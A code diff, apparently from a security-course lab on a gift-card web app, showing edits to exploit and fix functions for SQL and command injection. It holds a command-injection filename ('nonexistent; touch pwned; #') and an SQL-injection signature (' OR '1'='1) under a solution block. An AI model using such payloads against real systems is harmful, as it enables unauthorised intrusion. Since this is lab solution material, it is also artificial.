@@ -1811,7 +1811,7 @@ def exploit_sql_injection_vulnerability():
 
         # Create a card with the malicious signature
         card_data = {
-            "merchant_id": "NYU Electronics Card",
+            "merchant_id": "GPT-4 API Credits",
             "customer_id": "test2",
             "total_value": 500,
             "records": [
@@ -2208,8 +2208,9 @@ def fix_sql_injection_vulnerability():
                     fp.write(card_data)
                     fp.close()
                     
+                    product = Product.objects.get(product_name=prod)
                     card = Card(data=card_data, fp=card_file_path, user=request.user, used=True, 
-                            product=Product.objects.get(product_name=prod), amount=total_value)
+                            product=product, amount=total_value)
                     card.save()
                 else:
                     context['card_found'] = card_query_string
@@ -2558,7 +2559,7 @@ def exploit_cmd_injection_vulnerability():
     if "SOLUTION":
         malicious_filename = "nonexistent; touch pwned; #"
         
-        malformed_json = '{"merchant_id": "Electronics Card","customer_id": "test2", "total_value": 100,"records": [{"record_type": "amount_change","amount_added": 100,,"signature": "\' OR \'1\'=\'1"}]}'
+        malformed_json = '{"merchant_id": "AI Art Generator Tokens","customer_id": "test2", "total_value": 100,"records": [{"record_type": "amount_change","amount_added": 100,,"signature": "\' OR \'1\'=\'1"}]}'
         
         post_params = {
             'card_supplied': 'True',
